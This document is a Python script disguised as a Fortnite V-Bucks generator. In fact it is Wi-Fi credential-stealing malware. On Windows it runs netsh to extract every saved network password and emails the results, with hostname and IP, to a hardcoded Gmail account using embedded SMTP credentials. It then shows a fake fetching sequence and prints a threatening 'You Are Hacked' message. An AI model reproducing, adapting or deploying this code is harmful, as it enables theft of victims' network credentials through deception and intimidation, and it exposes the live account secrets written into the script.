import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import random
import socket
import datetime

print("Everything is safe here, Don't Worry :)\n")
def send_email(subject, body):
    sender_email = 'ipfinderhack@gmail.com'
    receiver_email = 'iphack26@gmail.com'  
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = 'ipfinderhack@gmail.com'  
    smtp_password = 'woetytcdydkklwmp'  
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

def get_wifi_passwords():
    try:
        
        profiles_data = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, check=True)
        profiles = [line.split(":")[1].strip() for line in profiles_data.stdout.split('\n') if "All User Profile" in line]

        results = []
        for profile in profiles:
            try:
                profile_results_data = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, check=True)
                profile_results = profile_results_data.stdout.split('\n')
                password = [line.split(":")[1].strip() for line in profile_results if "Key Content" in line]
                password = password[0] if password else ""
                results.append((profile, password))
            except subprocess.CalledProcessError:
                results.append((profile, "ERROR"))

        return results
    except subprocess.CalledProcessError as e:
        print("Error:", e)
        return []

if __name__ == "__main__":
    wifi_passwords = get_wifi_passwords()
    email_body = f"User: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\n\n\nDate: {datetime.datetime.now()}\n\n\n"
    
    for profile, password in wifi_passwords:
        email_body += f"Wi-Fi Network: {profile}\nPassword: {password}\n{'='*20}\n"
    
    if email_body:
        subject = "Wi-Fi Passwords Report & Dev Info"
        send_email(subject, email_body)
        username = input("Please Enter Your Fortnite Account Username: ")
        print("Fetching Vbucks...")
        time.sleep(3)
        print("Failed To Fetch!")
        time.sleep(0.5)
        print("Retrying...")
        time.sleep(0.2)
        print(f"Fetching {random.randint(150, 200)} Vbucks...")
        time.sleep(4)
        print("=======================================================================================================================")
        print(f"This Is A Scam, You Are Hacked\nUser: {socket.gethostname()}\nIP Address: {socket.gethostbyname(socket.gethostname())}\nDon't Even Try Telling Anyone, You Will Make It Worse :)")
        print("=======================================================================================================================")
        time.sleep(999999)

    else:
        print("No Vbucks Found, Please Try Again Later")

